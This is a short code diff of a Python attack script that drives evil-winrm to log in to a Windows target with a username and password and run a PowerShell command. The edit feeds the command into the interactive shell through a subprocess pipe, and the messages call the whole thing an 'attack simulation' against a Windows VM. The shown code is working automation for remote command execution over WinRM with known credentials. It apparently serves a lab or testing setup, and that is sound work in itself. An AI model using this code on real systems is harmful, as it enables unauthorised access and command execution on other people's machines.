@@ -46,12 +46,35 @@ def main():
         "evil-winrm",
         "-i", TARGET_IP,
         "-u", USERNAME,
-        "-p", PASSWORD,
-        "-c", ps_command
+        "-p", PASSWORD
     ]
     
-    print(f"[*] Running: {' '.join(evil_winrm_cmd)}")
-    subprocess.run(evil_winrm_cmd)
+    print(f"[*] Connecting to {TARGET_IP} via Evil-WinRM...")
+    
+    # We use Popen to feed the command directly into the interactive WinRM shell
+    try:
+        process = subprocess.Popen(
+            evil_winrm_cmd, 
+            stdin=subprocess.PIPE, 
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        # Send the command, add a small delay, then send Ctrl+D (\x04) to exit the shell
+        input_data = f"{ps_command}\n\x04"
+        stdout, stderr = process.communicate(input=input_data, timeout=15)
+        
+        if "Error" in stderr or "Exception" in stderr:
+            print("[-] Possible error during execution:")
+            print(stderr)
+        else:
+            print("[+] Execution sent successfully.")
+            
+    except subprocess.TimeoutExpired:
+        process.kill()
+        print("[-] WinRM connection timed out.")
+        sys.exit(1)
     
     print("[+] Attack simulation launched. Check the Windows VM screen!")
 
